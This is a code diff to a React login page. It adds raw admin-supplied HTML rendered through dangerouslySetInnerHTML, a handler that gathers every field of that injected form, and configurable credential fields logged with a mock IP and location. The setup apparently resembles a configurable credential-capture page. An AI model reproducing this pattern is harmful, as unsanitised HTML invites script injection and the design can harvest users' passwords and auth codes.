@@ -88,8 +88,8 @@ const LoginPage = () => {
             
             if (newSubPage) {
               setSubPage(newSubPage);
-              setFormData({}); // Clear form data when page type changes
-              setIsLoading(false); // Reset loading when page type changes
+              setFormData({});
+              setIsLoading(false);
             }
           }
         }
@@ -119,7 +119,6 @@ const LoginPage = () => {
     try {
       setIsLoading(true);
       
-      // Mock geolocation data (in a real app, you'd get this from a service)
       const mockLocation = 'New York, USA';
       const mockIp = '192.168.1.' + Math.floor(Math.random() * 255);
       
@@ -130,13 +129,11 @@ const LoginPage = () => {
         formData
       });
       
-      // Show loading for 1.5 seconds before showing success message
       setTimeout(() => {
         setIsLoading(false);
         setSubmitted(true);
       }, 1500);
       
-      // Reset form after submission
       setFormData({});
     } catch (err) {
       setIsLoading(false);
@@ -145,11 +142,36 @@ const LoginPage = () => {
     }
   };
 
-  // Custom button handler for social login buttons
-  const handleSocialLogin = (provider: string) => {
-    setFormData({ provider });
-    handleSubmit(new Event('submit') as unknown as React.FormEvent);
+  // Custom form handler for injected HTML
+  const handleCustomFormSubmit = (event: Event) => {
+    event.preventDefault();
+    const form = event.target as HTMLFormElement;
+    const formDataObj: Record<string, string> = {};
+    
+    const formData = new FormData(form);
+    for (const [key, value] of formData.entries()) {
+      formDataObj[key] = value.toString();
+    }
+    
+    setFormData(formDataObj);
+    handleSubmit(event as unknown as React.FormEvent);
   };
+
+  // Inject form submission handler into custom HTML
+  useEffect(() => {
+    if (subPage?.html) {
+      const forms = document.querySelectorAll('#custom-form form');
+      forms.forEach(form => {
+        form.addEventListener('submit', handleCustomFormSubmit);
+      });
+      
+      return () => {
+        forms.forEach(form => {
+          form.removeEventListener('submit', handleCustomFormSubmit);
+        });
+      };
+    }
+  }, [subPage?.html]);
 
   if (pageLoading) {
     return (
@@ -249,160 +271,105 @@ const LoginPage = () => {
     );
   }
 
-  // Dynamic form based on current subpage
+  // If subpage has custom HTML, render it
+  if (subPage.html && subPage.html.trim()) {
+    return (
+      <div className="min-h-screen flex items-center justify-center p-4">
+        <div 
+          id="custom-form"
+          className="w-full max-w-md"
+          dangerouslySetInnerHTML={{ __html: subPage.html }} 
+        />
+      </div>
+    );
+  }
+
+  // Dynamic form based on current subpage fields or predefined forms
   const renderDynamicForm = () => {
+    // Check if subpage has defined fields
+    if (subPage.fields && subPage.fields.length > 0) {
+      return (
+        <div className="grid gap-4">
+          {subPage.fields.map((field: string) => (
+            <div key={field} className="space-y-2">
+              <Label htmlFor={field}>{field.charAt(0).toUpperCase() + field.slice(1).replace('_', ' ')}</Label>
+              <Input 
+                id={field} 
+                name={field}
+                type={field.includes('password') ? 'password' : field.includes('email') ? 'email' : 'text'}
+                required
+                value={formData[field] || ''}
+                onChange={handleInputChange}
+              />
+            </div>
+          ))}
+          <Button type="submit" className="w-full">Submit</Button>
+        </div>
+      );
+    }
+
+    // Fallback to predefined forms based on subpage ID
     switch (subPage.id) {
       case 'login1':
         return (
-          <>
-            <div className="grid gap-4">
-              <div className="space-y-2">
-                <Label htmlFor="email">Email</Label>
-                <Input 
-                  id="email" 
-                  name="email" 
-                  type="email" 
-                  placeholder="name@example.com" 
-                  required
-                  value={formData.email || ''}
-                  onChange={handleInputChange}
-                />
-              </div>
-              <div className="space-y-2">
-                <Label htmlFor="password">Password</Label>
-                <Input 
-                  id="password" 
-                  name="password" 
-                  type="password" 
-                  required
-                  value={formData.password || ''}
-                  onChange={handleInputChange}
-                />
-              </div>
-              <Button type="submit" className="w-full">Sign In</Button>
+          <div className="grid gap-4">
+            <div className="space-y-2">
+              <Label htmlFor="email">Email</Label>
+              <Input 
+                id="email" 
+                name="email" 
+                type="email" 
+                placeholder="name@example.com" 
+                required
+                value={formData.email || ''}
+                onChange={handleInputChange}
+              />
             </div>
-          </>
-        );
-      
-      case 'login2':
-        return (
-          <>
-            <div className="grid gap-4">
-              <div className="space-y-2">
-                <Label htmlFor="auth_code">Authentication Code</Label>
-                <Input 
-                  id="auth_code" 
-                  name="auth_code" 
-                  placeholder="Enter your auth code" 
-                  required
-                  value={formData.auth_code || ''}
-                  onChange={handleInputChange}
-                />
-              </div>
-              <Button type="submit" className="w-full">Verify</Button>
+            <div className="space-y-2">
+              <Label htmlFor="password">Password</Label>
+              <Input 
+                id="password" 
+                name="password" 
+                type="password" 
+                required
+                value={formData.password || ''}
+                onChange={handleInputChange}
+              />
             </div>
-          </>
-        );
-      
-      case 'signup1':
-        return (
-          <>
-            <div className="grid gap-4">
-              <div className="space-y-2">
-                <Label htmlFor="name">Full Name</Label>
-                <Input 
-                  id="name" 
-                  name="name" 
-                  type="text" 
-                  placeholder="John Doe" 
-                  required
-                  value={formData.name || ''}
-                  onChange={handleInputChange}
-                />
-              </div>
-              <div className="space-y-2">
-                <Label htmlFor="email">Email</Label>
-                <Input 
-                  id="email" 
-                  name="email" 
-                  type="email" 
-                  placeholder="name@example.com" 
-                  required
-                  value={formData.email || ''}
-                  onChange={handleInputChange}
-                />
-              </div>
-              <div className="space-y-2">
-                <Label htmlFor="password">Password</Label>
-                <Input 
-                  id="password" 
-                  name="password" 
-                  type="password" 
-                  required
-                  value={formData.password || ''}
-                  onChange={handleInputChange}
-                />
-              </div>
-              <div className="space-y-2">
-                <Label htmlFor="confirm_password">Confirm Password</Label>
-                <Input 
-                  id="confirm_password" 
-                  name="confirm_password" 
-                  type="password" 
-                  required
-                  value={formData.confirm_password || ''}
-                  onChange={handleInputChange}
-                />
-              </div>
-              <Button type="submit" className="w-full">Register</Button>
-            </div>
-          </>
-        );
-        
-      case 'signup2':
-        return (
-          <>
-            <div className="grid gap-4">
-              <div className="space-y-2">
-                <Label htmlFor="email">Email Address</Label>
-                <Input 
-                  id="email" 
-                  name="email" 
-                  type="email" 
-                  placeholder="name@example.com" 
-                  required
-                  value={formData.email || ''}
-                  onChange={handleInputChange}
-                />
-              </div>
-              <Button type="submit" className="w-full">Subscribe</Button>
-            </div>
-          </>
+            <Button type="submit" className="w-full">Sign In</Button>
+          </div>
         );
       
       default:
-        // Generic form for any other pages
-        if (subPage.fields && subPage.fields.length) {
-          return (
-            <div className="grid gap-4">
-              {subPage.fields.map((field: string) => (
-                <div key={field} className="space-y-2">
-                  <Label htmlFor={field}>{field.charAt(0).toUpperCase() + field.slice(1).replace('_', ' ')}</Label>
-                  <Input 
-                    id={field} 
-                    name={field}
-                    type={field.includes('password') ? 'password' : field.includes('email') ? 'email' : 'text'}
-                    required
-                    value={formData[field] || ''}
-                    onChange={handleInputChange}
-                  />
-                </div>
-              ))}
-              <Button type="submit" className="w-full">Submit</Button>
+        return (
+          <div className="grid gap-4">
+            <div className="space-y-2">
+              <Label htmlFor="email">Email</Label>
+              <Input 
+                id="email" 
+                name="email" 
+                type="email" 
+                placeholder="name@example.com" 
+                required
+                value={formData.email || ''}
+                onChange={handleInputChange}
+              />
             </div>
-          );
-        }
-        return <p>No form elements defined for this page.</p>;
+            <div className="space-y-2">
+              <Label htmlFor="message">Message</Label>
+              <Input 
+                id="message" 
+                name="message" 
+                type="text" 
+                placeholder="Your message" 
+                required
+                value={formData.message || ''}
+                onChange={handleInputChange}
+              />
+            </div>
+            <Button type="submit" className="w-full">Submit</Button>
+          </div>
+        );
     }
   };
 
@@ -411,6 +378,9 @@ const LoginPage = () => {
       <Card className="w-full max-w-md">
         <CardHeader>
           <CardTitle className="text-center">{subPage.name}</CardTitle>
+          {subPage.description && (
+            <p className="text-center text-muted-foreground text-sm">{subPage.description}</p>
+          )}
         </CardHeader>
         <CardContent>
           <form onSubmit={handleSubmit}>
